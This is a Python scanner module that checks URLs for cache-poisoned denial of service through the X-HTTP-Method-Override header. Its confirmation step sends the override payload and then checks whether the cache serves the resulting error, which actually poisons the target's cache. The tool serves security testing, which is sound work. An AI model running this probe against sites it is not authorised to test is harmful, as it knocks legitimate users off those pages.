#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with HTTP Method Override (HMO)
https://cpdos.org/#HMO
"""

from ..utils import * 

VULN_NAME = "HTTP Method Override"

def HMO(url, s, main_status_code, authent):
    methods = ["POST", "PUT", "HELP", "DELETE"]
    for m in methods:
        headers = {"X-HTTP-Method-Override": m}
        req_hmo = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
        if req_hmo.status_code in [404, 405] and req_hmo.status_code != main_status_code:
            req_verify_hmo = s.get(url, verify=False, timeout=10, auth=authent)
            if req_verify_hmo.status_code == req_hmo.status_code and req_verify_hmo.status_code != main_status_code:
                print(f"  \033[31m └── VULNERABILITY CONFIRMED\033[0m | HMO DOS: {url} | \033[34m{main_status_code} > {req_verify_hmo.status_code}\033[0m | PAYLOAD: {headers}")